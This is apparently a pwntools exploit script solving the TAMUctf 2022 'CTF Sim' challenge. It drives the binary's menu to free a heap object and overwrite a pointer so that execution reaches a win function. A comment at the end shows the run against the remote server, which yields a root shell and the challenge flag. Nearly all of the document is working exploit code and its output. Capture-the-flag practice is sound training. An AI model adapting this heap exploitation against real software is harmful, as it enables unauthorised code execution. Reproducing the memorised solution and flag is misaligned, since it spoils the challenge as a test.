from pwn import *

context(os='linux', arch='amd64')
#context.log_level = 'debug'

BINARY = './ctf_sim'
elf  = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  s = remote("tamuctf.com", 443, ssl=True, sni="ctf-sim")
else:
  s = process(BINARY)

def Download(category, idx):
  s.sendlineafter("> ", "1")
  s.sendlineafter("> ", str(category))
  s.sendlineafter("> ", str(idx))
  
def Solve(idx):
  s.sendlineafter("> ", "2")
  s.sendlineafter("> ", str(idx))

def Submit(size, writeup):
  s.sendlineafter("> ", "3")
  s.sendlineafter("> ", str(size))
  s.sendlineafter("> ", writeup)

win_addr = 0x4011d2

Download(1, 0)  
Solve(0)
Submit(0x10, p64(0x404088))
Solve(0)

s.interactive()

'''
mito@ubuntu:~/CTF/TAMUctf_2022/Pwn_CTF_Sim$ python3 solve.py r
[*] '/home/mito/CTF/TAMUctf_2022/Pwn_CTF_Sim/ctf_sim'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to tamuctf.com on port 443: Done
[*] Switching to interactive mode
$ id
uid=0(root) gid=0(root) groups=0(root)
$ ls -l
total 28
-rwxr-xr-x 1 root root 19400 Apr 13 04:53 ctf_sim
-rw-r--r-- 1 root root    70 Apr 13 04:53 docker_entrypoint.sh
-rw-r--r-- 1 root root    26 Apr  9 22:54 flag.txt
$ cat flag.txt
gigem{h34pl355_1n_53477l3}
'''
